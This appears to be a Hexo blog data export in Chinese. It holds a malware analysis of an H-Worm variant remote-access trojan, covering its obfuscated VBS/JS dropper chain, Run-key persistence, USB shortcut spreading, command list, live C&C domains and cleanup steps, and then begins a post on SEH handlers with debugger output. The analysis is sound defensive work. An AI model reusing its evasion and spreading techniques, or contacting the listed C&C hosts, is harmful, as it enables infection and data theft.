启动kleylogger|\n|offline-keylogger| 启动离线版kerlogger|\n|browse-logs|   上传日志|\n|cmd-shell| 执行cmd命令|\n|get-processes| 枚举进程|\n|disable-uac|   关闭UAC|\n|check-eligible|    检测权限|\n|force-eligible| 暴力提权   |\n|elevate|  普通提权 |\n|if-elevate|   检测权限 |\n|kill-process| 结束进程 |\n|sleep| 挂起进程|\n\n这个程序会释放一个脚本到%appdata%下去，命名为`aFCnKVCdfY.js`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916164502275.png)\n\n### 脚本4\naFCnKVCdfY.js这个和脚本三是一样的，除了域名变了，其他都没变化。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916174051698.png)\n\n\n\n## 样本溯源\n**C&C**\nunknownsoft.duckdns.org:7744\nglobalization.duckdns.org:50071\n\n\n## 查杀方案\n删除自启动表项\nHKEY_CURRENT_USER\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\scriptName\nHKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\scriptName\n\n删除\n%appdata%\\\\aFCnKVCdfY.js\n%temp%\\\\aFCnKVCdfY.js\n%APPDATA%\\\\taskmgr.js \n\n## 总结\n谨防不明来路的邮件，网页 文件要谨慎，要对未知文件表示怀疑，切勿怀着试一试的态度打开\n\n","source":"_posts/H-WORM变种远控分析.md","raw":"---\ntitle: H-WORM变种远控分析\ndate: 2019-09-04 19:11:22\nindex_img: https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_4c746d4df0.jpg\nbanner_img: https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_4c746d4df0.jpg\ntags:\n    - Rat H-worm\ncategories: 样本详细分析\n---\n\n\n\n## 基本信息\n\n|FileName| FileType|MD5|Size|\n|--|--|--|--|\n| 4gdrwceq60b7dbl.sct| rat  |69B7D326575C5616D82645960B3D081A|403845 bytes|\n\n## 简介\n该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。\n\n\n## 流程图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916190802115.png)\n## 详细分析\n这个样本母体总共会释放3个脚本\n### 脚本1\n首先我们看看`4gdrwceq60b7dbl.sct`，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件\n我们用`Sublimi Text`来打开它，记事本也是可以的。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916155338357.png)\n利用组数来存关键字符串，通过字符串的拼接来合成完整路径\n会尝试删除`%APPDATA%\\\\taskmgr.js`  这个文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916155609819.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916160236624.png)\n文件中有很长一段密文，这里我改名为了`EncodeList`，通过`System.IO.MemoryStream.WriteByte()`方法把数据读入数据流中。\n最重要的是使用`ADODB.Stream`类方法把这个数据流保存到了被上面删除掉的`%APPDATA%\\\\taskmgr.js`文件中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916155832544.png)\n最后使用`WScript.Shell.Run`方法运行`taskmgr.js`文件\n\n我这里使Python给他拿出来，命名为`taskmgr.js`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916161513776.png)\n### 脚本2\n下面是`taskmgr.js` ，这个脚本其实还是一个解密脚本，也是 使用`AdoDB.Stream`处理数据流，然后使用`monKeyKing`中动态生成的eval方法去执行数据，来达到免杀\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916162014581.png)\n通过一个`Microsoft.XmlDom`的创建一个`tmp`对象，然后把这个对象赋予`eval`方法\n最后就可以用`this.p`去访问到`Microsoft.XmlDom.tmp`，来达到命令执行\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916162041325.png)\n当然执行的命令也肯定是被加过密的，下面就是解密数据部分，这里就简单的把base64后的结果，然后把字符\"A\"替换成\"!-%\"\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916163628179.png)\n\n最后使用上面构造的`eval`去执行这段解密的代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091616391031.png)\n\n### 脚本3 核心代码\n这里开始分析脚本2中解密出来的代码\n\n根据这host，port和代码量，可以判断出这个应该就是这个样本的实现核心的地方了。\n这里其实这是一个远控加感染U盘传播\n#### U盘传播\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916165932567.png)\n加入开机启动注册表项，来达到持久化攻击，这基本已是木马的共性\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916170039587.png)\n\n在下面的try块中，有一个install函数会被循环调用，这个函数是用来检测感染移动存储设备的\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916170300961.png)\ninstall() 会去判断当前系统磁盘是否有U盘或其他移动存储介质，有的话就执行感染操作\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916170657111.png)\n枚举移动盘文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916171010711.png)\n如果文件不是快捷方式，那就将权限改为**隐藏**和**系统权限**，然后给他们创建一个同名`.lnk`的快捷方式\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916171254264.png)\n快捷方式被修改为了特殊构造的恶意代码，构造过程如下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916171656803.png)\n这样每个文件都会被隐藏，然后生成一个被感染的快捷方式去诱惑其他人点击，只要一点击，就会被感染。\n\n#### 远控模块\n\n这个远控一共有`26`个命令模块，分别是\n|命令  |含义  |\n|--|--|\n|disconnect|   断开连接 |\n|reboot|   重启脚本 |\n|shutdown| 关闭脚本 |\n|excecute| 执行命令  |\n|install-sdk|  安装SDK |\n|get-pass|搜集密码  |\n|get-pass-offline|  获取浏览器密码|\n|update|    更新|\n|uninstall| 卸载|\n|up-n-exec| 请求下载执行文件|\n|bring-log| 上传日志|\n|down-n-exec|  下载执行文件 |\n|filemanager|   文件管理|\n|rdp|  启动RDP |\n|keylogger| 启动kleylogger|\n|offline-keylogger| 启动离线版kerlogger|\n|browse-logs|   上传日志|\n|cmd-shell| 执行cmd命令|\n|get-processes| 枚举进程|\n|disable-uac|   关闭UAC|\n|check-eligible|    检测权限|\n|force-eligible| 暴力提权   |\n|elevate|  普通提权 |\n|if-elevate|   检测权限 |\n|kill-process| 结束进程 |\n|sleep| 挂起进程|\n\n这个程序会释放一个脚本到%appdata%下去，命名为`aFCnKVCdfY.js`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916164502275.png)\n\n### 脚本4\naFCnKVCdfY.js这个和脚本三是一样的，除了域名变了，其他都没变化。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916174051698.png)\n\n\n\n## 样本溯源\n**C&C**\nunknownsoft.duckdns.org:7744\nglobalization.duckdns.org:50071\n\n\n## 查杀方案\n删除自启动表项\nHKEY_CURRENT_USER\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\scriptName\nHKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\scriptName\n\n删除\n%appdata%\\\\aFCnKVCdfY.js\n%temp%\\\\aFCnKVCdfY.js\n%APPDATA%\\\\taskmgr.js \n\n## 总结\n谨防不明来路的邮件，网页 文件要谨慎，要对未知文件表示怀疑，切勿怀着试一试的态度打开\n\n","slug":"H-WORM变种远控分析","published":1,"updated":"2019-12-07T03:10:35.997Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw628000uccuqk21tussu","content":"<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>4gdrwceq60b7dbl.sct</td>\n<td>rat</td>\n<td>69B7D326575C5616D82645960B3D081A</td>\n<td>403845 bytes</td>\n</tr>\n</tbody></table>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190916190802115.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>这个样本母体总共会释放3个脚本</p>\n<h3 id=\"脚本1\"><a href=\"#脚本1\" class=\"headerlink\" title=\"脚本1\"></a>脚本1</h3><p>首先我们看看<code>4gdrwceq60b7dbl.sct</code>，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件<br>我们用<code>Sublimi Text</code>来打开它，记事本也是可以的。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190916155338357.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>利用组数来存关键字符串，通过字符串的拼接来合成完整路径<br>会尝试删除<code>%APPDATA%\\\\taskmgr.js</code>  这个文件<br><img src=\"https://img-blog.csdnimg.cn/20190916155609819.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190916160236624.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>文件中有很长一段密文，这里我改名为了<code>EncodeList</code>，通过<code>System.IO.MemoryStream.WriteByte()</code>方法把数据读入数据流中。<br>最重要的是使用<code>ADODB.Stream</code>类方法把这个数据流保存到了被上面删除掉的<code>%APPDATA%\\\\taskmgr.js</code>文件中<br><img src=\"https://img-blog.csdnimg.cn/20190916155832544.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>最后使用<code>WScript.Shell.Run</code>方法运行<code>taskmgr.js</code>文件</p>\n<p>我这里使Python给他拿出来，命名为<code>taskmgr.js</code><br><img src=\"https://img-blog.csdnimg.cn/20190916161513776.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"脚本2\"><a href=\"#脚本2\" class=\"headerlink\" title=\"脚本2\"></a>脚本2</h3><p>下面是<code>taskmgr.js</code> ，这个脚本其实还是一个解密脚本，也是 使用<code>AdoDB.Stream</code>处理数据流，然后使用<code>monKeyKing</code>中动态生成的eval方法去执行数据，来达到免杀<br><img src=\"https://img-blog.csdnimg.cn/20190916162014581.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>通过一个<code>Microsoft.XmlDom</code>的创建一个<code>tmp</code>对象，然后把这个对象赋予<code>eval</code>方法<br>最后就可以用<code>this.p</code>去访问到<code>Microsoft.XmlDom.tmp</code>，来达到命令执行<br><img src=\"https://img-blog.csdnimg.cn/20190916162041325.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>当然执行的命令也肯定是被加过密的，下面就是解密数据部分，这里就简单的把base64后的结果，然后把字符”A”替换成”!-%”<br><img src=\"https://img-blog.csdnimg.cn/20190916163628179.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>最后使用上面构造的<code>eval</code>去执行这段解密的代码<br><img src=\"https://img-blog.csdnimg.cn/2019091616391031.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"脚本3-核心代码\"><a href=\"#脚本3-核心代码\" class=\"headerlink\" title=\"脚本3 核心代码\"></a>脚本3 核心代码</h3><p>这里开始分析脚本2中解密出来的代码</p>\n<p>根据这host，port和代码量，可以判断出这个应该就是这个样本的实现核心的地方了。<br>这里其实这是一个远控加感染U盘传播</p>\n<h4 id=\"U盘传播\"><a href=\"#U盘传播\" class=\"headerlink\" title=\"U盘传播\"></a>U盘传播</h4><p><img src=\"https://img-blog.csdnimg.cn/20190916165932567.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>加入开机启动注册表项，来达到持久化攻击，这基本已是木马的共性<br><img src=\"https://img-blog.csdnimg.cn/20190916170039587.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>在下面的try块中，有一个install函数会被循环调用，这个函数是用来检测感染移动存储设备的<br><img src=\"https://img-blog.csdnimg.cn/20190916170300961.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>install() 会去判断当前系统磁盘是否有U盘或其他移动存储介质，有的话就执行感染操作<br><img src=\"https://img-blog.csdnimg.cn/20190916170657111.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>枚举移动盘文件<br><img src=\"https://img-blog.csdnimg.cn/20190916171010711.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>如果文件不是快捷方式，那就将权限改为<strong>隐藏</strong>和<strong>系统权限</strong>，然后给他们创建一个同名<code>.lnk</code>的快捷方式<br><img src=\"https://img-blog.csdnimg.cn/20190916171254264.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>快捷方式被修改为了特殊构造的恶意代码，构造过程如下<br><img src=\"https://img-blog.csdnimg.cn/20190916171656803.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这样每个文件都会被隐藏，然后生成一个被感染的快捷方式去诱惑其他人点击，只要一点击，就会被感染。</p>\n<h4 id=\"远控模块\"><a href=\"#远控模块\" class=\"headerlink\" title=\"远控模块\"></a>远控模块</h4><p>这个远控一共有<code>26</code>个命令模块，分别是<br>|命令  |含义  |<br>|–|–|<br>|disconnect|   断开连接 |<br>|reboot|   重启脚本 |<br>|shutdown| 关闭脚本 |<br>|excecute| 执行命令  |<br>|install-sdk|  安装SDK |<br>|get-pass|搜集密码  |<br>|get-pass-offline|  获取浏览器密码|<br>|update|    更新|<br>|uninstall| 卸载|<br>|up-n-exec| 请求下载执行文件|<br>|bring-log| 上传日志|<br>|down-n-exec|  下载执行文件 |<br>|filemanager|   文件管理|<br>|rdp|  启动RDP |<br>|keylogger| 启动kleylogger|<br>|offline-keylogger| 启动离线版kerlogger|<br>|browse-logs|   上传日志|<br>|cmd-shell| 执行cmd命令|<br>|get-processes| 枚举进程|<br>|disable-uac|   关闭UAC|<br>|check-eligible|    检测权限|<br>|force-eligible| 暴力提权   |<br>|elevate|  普通提权 |<br>|if-elevate|   检测权限 |<br>|kill-process| 结束进程 |<br>|sleep| 挂起进程|</p>\n<p>这个程序会释放一个脚本到%appdata%下去，命名为<code>aFCnKVCdfY.js</code><br><img src=\"https://img-blog.csdnimg.cn/20190916164502275.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"脚本4\"><a href=\"#脚本4\" class=\"headerlink\" title=\"脚本4\"></a>脚本4</h3><p>aFCnKVCdfY.js这个和脚本三是一样的，除了域名变了，其他都没变化。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190916174051698.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"样本溯源\"><a href=\"#样本溯源\" class=\"headerlink\" title=\"样本溯源\"></a>样本溯源</h2><p><strong>C&amp;C</strong><br>unknownsoft.duckdns.org:7744<br>globalization.duckdns.org:50071</p>\n<h2 id=\"查杀方案\"><a href=\"#查杀方案\" class=\"headerlink\" title=\"查杀方案\"></a>查杀方案</h2><p>删除自启动表项<br>HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\scriptName<br>HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\scriptName</p>\n<p>删除<br>%appdata%\\aFCnKVCdfY.js<br>%temp%\\aFCnKVCdfY.js<br>%APPDATA%\\taskmgr.js </p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>谨防不明来路的邮件，网页 文件要谨慎，要对未知文件表示怀疑，切勿怀着试一试的态度打开</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>4gdrwceq60b7dbl.sct</td>\n<td>rat</td>\n<td>69B7D326575C5616D82645960B3D081A</td>\n<td>403845 bytes</td>\n</tr>\n</tbody></table>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190916190802115.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>这个样本母体总共会释放3个脚本</p>\n<h3 id=\"脚本1\"><a href=\"#脚本1\" class=\"headerlink\" title=\"脚本1\"></a>脚本1</h3><p>首先我们看看<code>4gdrwceq60b7dbl.sct</code>，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件<br>我们用<code>Sublimi Text</code>来打开它，记事本也是可以的。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190916155338357.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>利用组数来存关键字符串，通过字符串的拼接来合成完整路径<br>会尝试删除<code>%APPDATA%\\\\taskmgr.js</code>  这个文件<br><img src=\"https://img-blog.csdnimg.cn/20190916155609819.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190916160236624.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>文件中有很长一段密文，这里我改名为了<code>EncodeList</code>，通过<code>System.IO.MemoryStream.WriteByte()</code>方法把数据读入数据流中。<br>最重要的是使用<code>ADODB.Stream</code>类方法把这个数据流保存到了被上面删除掉的<code>%APPDATA%\\\\taskmgr.js</code>文件中<br><img src=\"https://img-blog.csdnimg.cn/20190916155832544.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>最后使用<code>WScript.Shell.Run</code>方法运行<code>taskmgr.js</code>文件</p>\n<p>我这里使Python给他拿出来，命名为<code>taskmgr.js</code><br><img src=\"https://img-blog.csdnimg.cn/20190916161513776.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"脚本2\"><a href=\"#脚本2\" class=\"headerlink\" title=\"脚本2\"></a>脚本2</h3><p>下面是<code>taskmgr.js</code> ，这个脚本其实还是一个解密脚本，也是 使用<code>AdoDB.Stream</code>处理数据流，然后使用<code>monKeyKing</code>中动态生成的eval方法去执行数据，来达到免杀<br><img src=\"https://img-blog.csdnimg.cn/20190916162014581.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>通过一个<code>Microsoft.XmlDom</code>的创建一个<code>tmp</code>对象，然后把这个对象赋予<code>eval</code>方法<br>最后就可以用<code>this.p</code>去访问到<code>Microsoft.XmlDom.tmp</code>，来达到命令执行<br><img src=\"https://img-blog.csdnimg.cn/20190916162041325.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>当然执行的命令也肯定是被加过密的，下面就是解密数据部分，这里就简单的把base64后的结果，然后把字符”A”替换成”!-%”<br><img src=\"https://img-blog.csdnimg.cn/20190916163628179.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>最后使用上面构造的<code>eval</code>去执行这段解密的代码<br><img src=\"https://img-blog.csdnimg.cn/2019091616391031.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"脚本3-核心代码\"><a href=\"#脚本3-核心代码\" class=\"headerlink\" title=\"脚本3 核心代码\"></a>脚本3 核心代码</h3><p>这里开始分析脚本2中解密出来的代码</p>\n<p>根据这host，port和代码量，可以判断出这个应该就是这个样本的实现核心的地方了。<br>这里其实这是一个远控加感染U盘传播</p>\n<h4 id=\"U盘传播\"><a href=\"#U盘传播\" class=\"headerlink\" title=\"U盘传播\"></a>U盘传播</h4><p><img src=\"https://img-blog.csdnimg.cn/20190916165932567.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>加入开机启动注册表项，来达到持久化攻击，这基本已是木马的共性<br><img src=\"https://img-blog.csdnimg.cn/20190916170039587.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>在下面的try块中，有一个install函数会被循环调用，这个函数是用来检测感染移动存储设备的<br><img src=\"https://img-blog.csdnimg.cn/20190916170300961.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>install() 会去判断当前系统磁盘是否有U盘或其他移动存储介质，有的话就执行感染操作<br><img src=\"https://img-blog.csdnimg.cn/20190916170657111.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>枚举移动盘文件<br><img src=\"https://img-blog.csdnimg.cn/20190916171010711.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>如果文件不是快捷方式，那就将权限改为<strong>隐藏</strong>和<strong>系统权限</strong>，然后给他们创建一个同名<code>.lnk</code>的快捷方式<br><img src=\"https://img-blog.csdnimg.cn/20190916171254264.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>快捷方式被修改为了特殊构造的恶意代码，构造过程如下<br><img src=\"https://img-blog.csdnimg.cn/20190916171656803.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这样每个文件都会被隐藏，然后生成一个被感染的快捷方式去诱惑其他人点击，只要一点击，就会被感染。</p>\n<h4 id=\"远控模块\"><a href=\"#远控模块\" class=\"headerlink\" title=\"远控模块\"></a>远控模块</h4><p>这个远控一共有<code>26</code>个命令模块，分别是<br>|命令  |含义  |<br>|–|–|<br>|disconnect|   断开连接 |<br>|reboot|   重启脚本 |<br>|shutdown| 关闭脚本 |<br>|excecute| 执行命令  |<br>|install-sdk|  安装SDK |<br>|get-pass|搜集密码  |<br>|get-pass-offline|  获取浏览器密码|<br>|update|    更新|<br>|uninstall| 卸载|<br>|up-n-exec| 请求下载执行文件|<br>|bring-log| 上传日志|<br>|down-n-exec|  下载执行文件 |<br>|filemanager|   文件管理|<br>|rdp|  启动RDP |<br>|keylogger| 启动kleylogger|<br>|offline-keylogger| 启动离线版kerlogger|<br>|browse-logs|   上传日志|<br>|cmd-shell| 执行cmd命令|<br>|get-processes| 枚举进程|<br>|disable-uac|   关闭UAC|<br>|check-eligible|    检测权限|<br>|force-eligible| 暴力提权   |<br>|elevate|  普通提权 |<br>|if-elevate|   检测权限 |<br>|kill-process| 结束进程 |<br>|sleep| 挂起进程|</p>\n<p>这个程序会释放一个脚本到%appdata%下去，命名为<code>aFCnKVCdfY.js</code><br><img src=\"https://img-blog.csdnimg.cn/20190916164502275.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"脚本4\"><a href=\"#脚本4\" class=\"headerlink\" title=\"脚本4\"></a>脚本4</h3><p>aFCnKVCdfY.js这个和脚本三是一样的，除了域名变了，其他都没变化。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190916174051698.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"样本溯源\"><a href=\"#样本溯源\" class=\"headerlink\" title=\"样本溯源\"></a>样本溯源</h2><p><strong>C&amp;C</strong><br>unknownsoft.duckdns.org:7744<br>globalization.duckdns.org:50071</p>\n<h2 id=\"查杀方案\"><a href=\"#查杀方案\" class=\"headerlink\" title=\"查杀方案\"></a>查杀方案</h2><p>删除自启动表项<br>HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\scriptName<br>HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\scriptName</p>\n<p>删除<br>%appdata%\\aFCnKVCdfY.js<br>%temp%\\aFCnKVCdfY.js<br>%APPDATA%\\taskmgr.js </p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>谨防不明来路的邮件，网页 文件要谨慎，要对未知文件表示怀疑，切勿怀着试一试的态度打开</p>\n"},{"title":"SEH创建与查找","date":"2019-08-26T01:46:42.000Z","index_img":"https://w.wallhaven.cc/full/5d/wallhaven-5d2p17.jpg","banner_img":"https://w.wallhaven.cc/full/5d/wallhaven-5d2p17.jpg","_content":"\n\n\n创建一个SEH处理函数\n\n```\n#include \"stdafx.h\"\n#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <stdio.h>\n#include \"stdlib.h\"\n\nDWORD scratch;\n\nEXCEPTION_DISPOSITION exceptHandler(struct _EXCEPTION_RECORD *ExceptionRecord,\n\t\t\t\t\t\tvoid * EstablisherFrame,\n\t\t\t\t\t\tstruct _CONTEXT *ContextRecord,\n\t\t\t\t\t\tvoid * DispatcherContext)\n{\n\n\tunsigned i;\n\n\tMessageBox(0,_T(\"i am in except!!!\"),0,0);\n\n\tContextRecord->Eax = (DWORD)&scratch;//将eax的值修改为一个全局变量的地址，就可以写入了\n\n\t//printf(\"%08X \\n \", ContextRecord->Eip);//0x4114c5\n\n\tContextRecord->Eip += 0x2A;//这里修改的EIP，等于修改恢复异常后下一要执行的语句\n\n\treturn ExceptionContinueExecution;//这是异常处理的返回结果，让程序返回执行ContextRecord->Eip的代码\n}\nint main()\n{\n\t__asm\n\t{\n\t\tpush exceptHandler // handler函数的地址\n\t\tpush FS:[0] // 保存上一级的SEH链地址\n\t\tmov FS:[0],ESP // 安装新的EXECEPTION_REGISTRATION结构\n\t}\n\t__asm\n\t{\n\t\tmov eax, 0     // 将EAX清零\n\t\tmov[eax], 1 // 向0地址写入，会产生访问异常\n\t}\n\tprintf(\"Yes you right!!!\\n\");\n\t__asm\n\t{\n\t\tmov\teax, [ESP]    // 获取前一个结构\n\t\tmov FS:[0], EAX // 恢复之前的链\n\t\tadd esp, 8       // 恢复堆栈\n\t}\n\treturn 0;\n\n\tprintf(\"Hello Cray\\n\");\n\texit(0);\n}\n```\n\n\n\n![](D:\\git笔记\\source\\_posts\\20190826)\n\n \n\nWingdb 调试如图断下，地址访问异常\n\n我来看看在内存中的什么位置\n\n因为SHE链在线程环境块结构偏移为0的地方\n```\n0:000> !teb\nTEB at 7ffdf000\n    ExceptionList:        0012fe4c\n    StackBase:            00130000\n    StackLimit:           0012e000\n    SubSystemTib:         00000000\n    FiberData:            00001e00\n    ArbitraryUserPointer: 00000000\n    Self:                 7ffdf000\n    EnvironmentPointer:   00000000\n    ClientId:             000026a8 . 0000275c\n    RpcHandle:            00000000\n    Tls Storage:          7ffdf02c\n    PEB Address:          7ffd9000\n    LastErrorValue:       0\n    LastStatusValue:      c0000139\n    Count Owned Locks:    0\n    HardErrorMode:        0\n```\n查看teb结构地址。接下来我们将这个地址与TEB结构对应\n\n```\n0:000> dt _teb 7ffdf000 .\nntdll!_TEB\n   +0x000 NtTib            : \n      +0x000 ExceptionList    : 0x0012fe4c _EXCEPTION_REGISTRATION_RECORD\n      +0x004 StackBase        : 0x00130000 Void\n      +0x008 StackLimit       : 0x0012e000 Void\n      +0x00c SubSystemTib     : (null) \n      +0x010 FiberData        : 0x00001e00 Void\n      +0x010 Version          : 0x1e00\n      +0x014 ArbitraryUserPointer : (null) \n      +0x018 Self             : 0x7ffdf000 _NT_TIB\n   +0x01c EnvironmentPointer : \n   +0x020 ClientId         : \n      +0x000 UniqueProcess    : 0x000026a8 Void\n      +0x004 UniqueThread     : 0x0000275c Void\n   +0x028 ActiveRpcHandle  : \n   +0x02c ThreadLocalStoragePointer : \n   +0x030 ProcessEnvironmentBlock : \n```\n\n可以看到`_EXCEPTION_REGISTRATION_RECORD ` 结构的地址为\n\n\n0x0012fe4c \n\n```0:000> dt _EXCEPTION_REGISTRATION_RECORD 0012fe4c\nExceptions1!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x0012ff70 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x004110a0     _EXCEPTION_DISPOSITION  Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT+0\n```\nNext指向下一个处理函数，Handler指向当前SHE的处理函数\n\n```\n0:000> u 0x004110a0     \nExceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT:\n004110a0 e91b030000      jmp     Exceptions1!_except_handler1 (004113c0)\nExceptions1!ILT+160(__initterm):\n004110a5 e984220000      jmp     Exceptions1!initterm (0041332e)\nExceptions1!ILT+165(___crtTerminateProcess):\n004110aa e9cd220000      jmp     Exceptions1!_crtTerminateProcess (0041337c)\nExceptions1!ILT+170(___report_securityfailure):\n004110af e99c0d0000      jmp     Exceptions1!__report_securityfailure (00411e50)\nExceptions1!ILT+175(___atonexitinit):\n004110b4 e9271f0000      jmp     Exceptions1!__atonexitinit (00412fe0)\nExceptions1!ILT+180(__RTC_UninitUse):\n004110b9 e962180000      jmp     Exceptions1!_RTC_UninitUse (00412920)\nExceptions1!ILT+185(___report_securityfailureEx):\n004110be e99d0e0000      jmp     Exceptions1!__report_securityfailureEx (00411f60)\nExceptions1!ILT+190(__RTC_Shutdown):\n004110c3 